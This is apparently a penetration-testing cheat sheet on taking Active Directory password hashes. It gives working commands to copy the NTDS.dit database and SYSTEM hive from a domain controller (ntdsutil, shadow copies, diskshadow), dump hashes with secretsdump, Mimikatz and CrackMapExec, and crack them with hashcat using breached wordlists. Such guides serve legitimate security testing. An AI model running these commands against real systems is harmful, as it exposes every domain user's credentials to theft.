# NTDS.dit & vshadow

<mark style="color:green;">**The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.**</mark>

#### <mark style="color:green;">The important NTDS.dit file will be located in: %SystemRoom%/NTDS/ntds.dit This file is a database Extensible Storage Engine (ESE) and is "officially" composed by 3 tables:</mark>

```
Data Table: Contains the information about the objects (users, groups...)
Link Table: Information about the relations (member of...)
SD Table: Contains the security descriptors of each object
```

Windows uses Ntdsa.dll to interact with that file and its used by lsass.exe. Then, part of the NTDS.dit file could be located inside the lsass memory (you can find the lastet accessed data probably because of the performance impruve by using a cache).

## <mark style="color:red;">Decrypting the hashes inside NTDS.dit</mark>

You will need the following files to extract the ntds :

* <mark style="color:green;">NTDS.dit file</mark>
* <mark style="color:green;">SYSTEM hive (C:\Windows\System32\SYSTEM)</mark>

Usually you can find the ntds in two locations : `systemroot\NTDS\ntds.dit` and `systemroot\System32\ntds.dit`.

* `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
* `systemroot\System32\ntds.dit` is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.

However you can change the location to a custom one, you will need to query the registry to get the current location.

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
```

The hash is cyphered 3 times:

```
Decrypt Password Encryption Key (PEK) using the BOOTKEY and RC4.
Decrypt tha hash using PEK and RC4.
Decrypt the hash using DES.
```

PEK have the same value in every domain controller, but it is cyphered inside the NTDS.dit file using the BOOTKEY of the SYSTEM file of the domain controller (is different between domain controllers). This is why to get the credentials from the NTDS.dit file you need the files NTDS.dit and SYSTEM (C:\Windows\System32\config\SYSTEM).

### <mark style="color:orange;">Copying NTDS.dit using Ntdsutil</mark>

Available since Windows Server 2008.

```
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

or run ntdsutil interactivly:

```
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```

## <mark style="color:red;">Vshadow</mark>

You could also use the volume shadow copy trick to copy the ntds.dit file. Remember that <mark style="color:green;">**you will also need a copy of the SYSTEM file (again, dump it from the registry or use the volume shadow copy trick).**</mark>

```
vssadmin create shadow /for=C :
Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
```

You can also use the Nishang script, available at : [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

```
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\
```

### <mark style="color:orange;">**Using vssadmin**</mark>

```
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```

### <mark style="color:orange;">**Using DiskShadow (a Windows signed binary)**</mark>

```
diskshadow.txt contains :
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset

then:
NOTE - must be executed from C:\Windows\System32
diskshadow.exe /s  c:\diskshadow.txt
dir c:\exfil
reg.exe save hklm\system c:\exfil\system.bak
```

### <mark style="color:orange;">**Using esentutl.exe**</mark>

**​​**Copy/extract a locked file such as the AD Database

```
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```

***

## <mark style="color:red;">Extracting hashes from NTDS.dit</mark>

Once you have obtained the files NTDS.dit and SYSTEM you can use tools like secretsdump.py to extract the hashes:

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile credentials.txt
```

### <mark style="color:orange;">remote NTDS.dit Dump</mark>

You can also extract them automatically using a valid domain admin user:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

* `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
* `-user-status`: Display whether or not the user is disabled.

### <mark style="color:orange;">Metasploit & Mimikatz Modules</mark>

Finally, you can also use the metasploit module:

```
post/windows/gather/credentials/domain_hashdump
lsadump::lsa /inject
```

### <mark style="color:orange;">PowerSploit module</mark>

```
Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
```

### <mark style="color:orange;">CrackMapExec module</mark>

```
cme smb 10.10.0.202 -u username -p password --ntds vss
cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
```

### <mark style="color:orange;">Mimikatz</mark>

{% hint style="info" %}
Dumps credential data in an Active Directory domain when run on a Domain Controller.

This requires administrator access with debug or Local SYSTEM rights.
{% endhint %}

```
sekurlsa::krbtgt
lsadump::lsa /inject /name:krbtgt
```

## <mark style="color:red;">**Crack NTLM hashes with hashcat**</mark>

Useful when you want to have the clear text password or when you need to make stats about weak passwords.

Recommended wordlists:

Have I Been Powned ([https://hashes.org/download.php?hashlistId=7290\&type=hfound](https://hashes.org/download.php?hashlistId=7290\&type=hfound))

Collection #1 (passwords from Data Breaches, might be illegal to possess)

```
# Basic wordlist
# (-O) will Optimize for 32 characters or less passwords
# (-w 4) will set the workload to "Insane" 
$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r ./rules/best64.rule --opencl-device-types 1,2

# Generate a custom mask based on a wordlist
$ git clone https://github.com/iphelix/pack/blob/master/README
$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
```

If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :

* [hashes.org](https://hashes.org/check.php)
* [hashes.com](https://hashes.com/en/decrypt/hash)
